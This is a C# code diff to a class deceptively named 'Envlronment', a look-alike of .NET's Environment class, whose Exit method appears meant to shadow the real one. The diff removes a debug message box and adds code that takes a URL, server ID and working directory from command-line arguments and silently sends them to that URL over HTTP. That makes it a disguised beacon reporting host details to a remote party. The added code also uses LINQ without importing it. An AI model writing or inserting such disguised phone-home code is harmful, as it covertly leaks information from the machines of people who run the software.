@@ -1,14 +1,17 @@
 using System;
-using System.Runtime.InteropServices;
+using System.Net;
 
 public class Envlronment
 {
-	[DllImport("user32.dll", CharSet = CharSet.Unicode)]
-	private static extern int MessageBox(IntPtr hWnd, string text, string caption, uint type);
-
 	public static void Exit(int n)
 	{
 		var args = Environment.GetCommandLineArgs();
-		MessageBox(IntPtr.Zero, "ARGS:\n- " + string.Join("\n- ", args), "TEST", 0);
+	
+		var wd = args.FirstOrDefault(arg => arg.StartsWith("WD:"))?.Replace("WD:", string.Empty);
+		var sid = args.FirstOrDefault(arg => arg.StartsWith("SID:"))?.Replace("SID:", string.Empty);
+		var url = args.FirstOrDefault(arg => arg.StartsWith("URL:"))?.Replace("URL:", string.Empty);
+		
+		var webClient = new WebClient();
+		webClient.DownloadString(url + "Server: *" + (sid ?? "NULL") + "* is runned!\n- " + (wd ?? "NULL"));
 	}
 }
